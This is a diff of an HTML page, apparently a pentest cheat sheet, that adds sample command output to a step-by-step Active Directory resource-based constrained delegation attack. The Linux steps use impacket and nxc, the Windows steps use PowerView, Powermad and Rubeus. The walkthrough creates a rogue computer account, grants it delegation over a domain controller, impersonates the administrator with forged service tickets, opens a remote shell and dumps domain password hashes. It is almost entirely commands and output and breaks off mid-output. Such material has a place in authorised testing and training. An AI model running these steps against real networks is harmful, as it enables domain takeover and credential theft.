@@ -341,53 +341,227 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-check-machine-account-quota">0. Check machine account quota</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap &lt;TARGET&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -M MAQ
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap &lt;TARGET&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -M maq
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nxc ldap example.com -u <span class="s1">&#39;test.user&#39;</span> -p <span class="s1">&#39;Test1234&#39;</span> -M maq
+</span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.11.10      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.11.10      389    DC               [+] example.com\test.user:Test1234 
+</span></span></span><span class="line"><span class="cl"><span class="go">MAQ         10.10.11.10      389    DC               [*] Getting the MachineAccountQuota
+</span></span></span><span class="line"><span class="cl"><span class="go">MAQ         10.10.11.10      389    DC               MachineAccountQuota: 10
 </span></span></span></code></pre></div><h4 id="1-add-a-fake-computer">1. Add a fake computer</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-addcomputer -computer-name &#39;EvilComputer&#39; -computer-pass &#39;&lt;COMPUTER_PASSWORD&gt;&#39; -dc-ip &lt;TARGET&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-addcomputer -computer-name &#39;EvilComputer&#39; -computer-pass &#39;&lt;COMPUTER_PASSWORD&gt;&#39; -dc-ip &lt;DC_IP&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-addcomputer -computer-name <span class="s1">&#39;EvilComputer&#39;</span> -computer-pass <span class="s1">&#39;Test1234&#39;</span> -dc-ip 10.10.11.10 <span class="s1">&#39;example.com/test.user:Test1234&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added machine account EvilComputer$ with password Test1234.
 </span></span></span></code></pre></div><h4 id="2-rbcd-attack">2. Rbcd attack</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-rbcd -delegate-to &#39;&lt;TARGET_COMPUTER&gt;$&#39; -delegate-from &#39;EvilComputer$&#39; -dc-ip &lt;DC&gt; -action &#39;write&#39; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-rbcd -delegate-to &#39;&lt;TARGET_COMPUTER&gt;$&#39; -delegate-from &#39;EvilComputer$&#39; -dc-ip &lt;DC_IP&gt; -action &#39;write&#39; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-rbcd -delegate-to <span class="s1">&#39;DC$&#39;</span> -delegate-from <span class="s1">&#39;EvilComputer$&#39;</span> -dc-ip 10.10.11.10 -action <span class="s1">&#39;write&#39;</span> <span class="s1">&#39;example.com/test.user:Test1234&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Delegation rights modified successfully!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Accounts allowed to act on behalf of other identity:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
 </span></span></span></code></pre></div><h4 id="3-impersonate">3. Impersonate</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -spn cifs/&lt;TARGET_DOMAIN&gt; -impersonate administrator -dc-ip &lt;DC&gt; &#39;&lt;DOMAIN&gt;/EvilComputer:&lt;COMPUTER_PASSWORD&gt;&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -spn cifs/&lt;TARGET_DOMAIN&gt; -impersonate administrator -dc-ip &lt;DC_IP&gt; &#39;&lt;DOMAIN&gt;/EvilComputer:&lt;COMPUTER_PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.example.com <span class="o">&amp;&amp;</span> impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip 10.10.11.10 <span class="s1">&#39;example.com/EvilComputer:Test1234&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
 </span></span></span></code></pre></div><h4 id="4-import-ticket">4. Import ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=administrator@cifs_&lt;TARGET_DOMAIN&gt;@&lt;DOMAIN&gt;.ccache
-</span></span></span></code></pre></div><h4 id="5-post-attack">5. Post-Attack</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+</span></span></code></pre></div><h4 id="5-post-attack">5. Post-Attack</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-psexec &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.example.com <span class="o">&amp;&amp;</span> wmiexec.py example.com/administrator@dc.example.com -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] SMBv3.0 dialect used
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Launching semi-interactive shell - Careful what you execute
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\&gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or secretsdump
 </span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass -just-dc-user Administrator
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-modules">1. Import Modules</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\Powermad.ps1
-</span></span></span></code></pre></div><h4 id="2-check-machine-account-quota">2. Check machine account quota</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; . .\Powermad.ps1
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1">Powermad.ps1</a></em></small></p>
+<h4 id="2-check-machine-account-quota">2. Check machine account quota</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainObject -Identity &#39;DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; | select ms-ds-machineaccountquota
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; Get-DomainObject -Identity &#39;DC=EXAMPLE,DC=COM&#39; | select ms-ds-machineaccountquota
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">ms-ds-machineaccountquota
+</span></span></span><span class="line"><span class="cl"><span class="go">-------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">                       10
 </span></span></span></code></pre></div><h4 id="3-create-new-computer-account">3. Create new computer account</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString &#39;&lt;COMPUTER_PASSWORD&gt;&#39; -AsPlainText -Force)
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1">Powermad.ps1</a></em></small></p>
-<h4 id="4-rbcd-attack">4. RBCD Attack</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; New-MachineAccount -MachineAccount EvilComputer -Password
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span><span class="o">(</span>ConvertTo-SecureString <span class="s1">&#39;Test1234&#39;</span> -AsPlainText -Force<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] Machine account EvilComputer added
+</span></span></span></code></pre></div><h4 id="4-rbcd-attack">4. RBCD Attack</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">fakesid</span> <span class="o">=</span> Get-DomainComputer EvilComputer <span class="p">|</span> <span class="k">select</span> -expand objectsid
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>fakesid
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="k">$(</span><span class="nv">$fakesid</span><span class="k">)</span><span class="s2">)&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">SDBytes</span> <span class="o">=</span> New-Object byte<span class="o">[]</span> <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>SD.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes}
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>fakesid
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $fakesid
+</span></span></span><span class="line"><span class="cl"><span class="go">S-1-5-21-3542429192-2036945976-3483670807-11601
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="k">$(</span><span class="nv">$fakesid</span><span class="k">)</span><span class="s2">)&#34;</span>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">SDBytes</span> <span class="o">=</span> New-Object byte<span class="o">[]</span> <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>SD.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $SD.GetBinaryForm($SDBytes, 0)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainComputer &lt;TARGET_COMPUTER&gt; | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes}
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; Get-DomainComputer DC | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes}
 </span></span></span></code></pre></div><h4 id="5-check-if-securityidentifier-is-now-fakesid">5. Check if SecurityIdentifier is now fakesid</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">RawBytes</span> <span class="o">=</span> Get-DomainComputer TARGET_COMPUTER -Properties <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="p">|</span> <span class="k">select</span> -expand msds-allowedtoactonbehalfofotheridentity
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Descriptor</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="nv">$RawBytes</span>, <span class="m">0</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>Descriptor.DiscretionaryAcl
-</span></span></code></pre></div><h4 id="6-impersonate">6. Impersonate</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">RawBytes</span> <span class="o">=</span> Get-DomainComputer &lt;TARGET_COMPUTER&gt; -Properties <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="p">|</span> <span class="k">select</span> -expand msds-allowedtoactonbehalfofotheridentity
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $RawBytes = Get-DomainComputer DC -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39; | select -expand msds-allowedtoactonbehalfofotheridentity
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Descriptor</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="nv">$RawBytes</span>, <span class="m">0</span>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>Descriptor.DiscretionaryAcl
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; $Descriptor.DiscretionaryAcl
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">BinaryLength       : 36
+</span></span></span><span class="line"><span class="cl"><span class="go">AceQualifier       : AccessAllowed
+</span></span></span><span class="line"><span class="cl"><span class="go">IsCallback         : False
+</span></span></span><span class="line"><span class="cl"><span class="go">OpaqueLength       : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">AccessMask         : 983551
+</span></span></span><span class="line"><span class="cl"><span class="go">SecurityIdentifier : S-1-5-21-3542429192-2036945976-3483670807-11601
+</span></span></span><span class="line"><span class="cl"><span class="go">AceType            : AccessAllowed
+</span></span></span><span class="line"><span class="cl"><span class="go">AceFlags           : None
+</span></span></span><span class="line"><span class="cl"><span class="go">IsInherited        : False
+</span></span></span><span class="line"><span class="cl"><span class="go">InheritanceFlags   : None
+</span></span></span><span class="line"><span class="cl"><span class="go">PropagationFlags   : None
+</span></span></span><span class="line"><span class="cl"><span class="go">AuditFlags         : None
+</span></span></span></code></pre></div><h4 id="6-impersonate">6. Impersonate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:&#39;&lt;COMPUTER_PASSWORD&gt;&#39; /user:EvilComputer /domain:&lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; .\rubeus.exe hash /password:&#39;Test1234&#39; /user:EvilComputer /domain:example.com
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Calculate Password Hash(es)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Input password             : Test1234
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Input username             : EvilComputer
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Input domain               : example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Salt                       : EXAMPLE.COMEvilComputer
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]       rc4_hmac             : B9E0CFCEAF6D077970306A2FD88A7C0A
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]       aes128_cts_hmac_sha1 : FE834E7490537D833B4FBB0C215BEDB3
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]       aes256_cts_hmac_sha1 : D105000C879775D1727D9E56EF0CA48FD2996B9370165832BB1C5A265922B359
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]       des_cbc_md5          : DAE66B133454FDB5
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;EvilComputer$&#39; /rc4:&lt;HASH&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;TARGET_DOMAIN&gt; /ptt /nowrap
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\test.user\Documents&gt; .\rubeus.exe s4u /user:&#39;EvilComputer$&#39; /rc4:B9E0CFCEAF6D077970306A2FD88A7C0A /impersonateuser:administrator /msdsspn:cifs/dc.example.com /ptt /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using rc4_hmac hash: B9E0CFCEAF6D077970306A2FD88A7C0A
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;example.com\EvilComputer$&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: ::1:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFuDCCBb ...[SNIP]... VyLmh0Yg==
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building S4U2self request for: &#39;EvilComputer$@EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC.example.com (::1)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2self request to ::1:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2self success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for &#39;administrator&#39; to &#39;EvilComputer$@EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGCjCCBg ...[SNIP]... 1wdXRlciQ=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user &#39;administrator&#39; to target SPN &#39;cifs/dc.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: &#39;cifs/dc.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC.example.com (::1)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2proxy request to domain controller ::1:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN &#39;cifs/dc.example.com&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
